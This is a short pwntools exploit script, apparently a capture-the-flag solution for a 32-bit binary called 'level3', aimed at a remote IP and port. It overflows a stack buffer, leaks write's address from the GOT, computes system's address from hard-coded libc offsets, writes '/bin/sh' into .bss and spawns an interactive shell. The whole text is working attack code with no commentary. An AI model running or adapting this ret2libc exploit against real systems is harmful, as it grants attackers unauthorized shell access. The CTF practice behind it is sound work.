from pwn import *

context.log_level ='debug'
#sh = process('./level3')
sh = remote('111.198.29.45','31452')
libc = ELF('./level3')

bss_add = libc.bss()   

pay1 = 'a'*0x88 + 'bbbb' + p32(libc.symbols['write']) + p32(libc.symbols['vulnerable_function']) + p32(1) + p32(libc.got['write']) + p32(4)
sh.send(pay1)
sh.recvuntil(':\n')
data = u32(sh.recv(4))

#print hex(sys_add)

sys_add = data -0x0d43c0 + 0x03a940#- 0xd5b70 +0x3ada0
pay2 = 'a'*0x88 + 'bbbb' + p32(libc.symbols['read']) + p32(libc.symbols['vulnerable_function']) + p32(0) + p32(bss_add) + p32(8)    

sh.send(pay2)
sh.send('/bin/sh\x00') 

pay3 = 'a'*0x88 + 'bbbb' + p32(sys_add) + 'dead' + p32(bss_add)
sh.send(pay3)

sh.interactive()
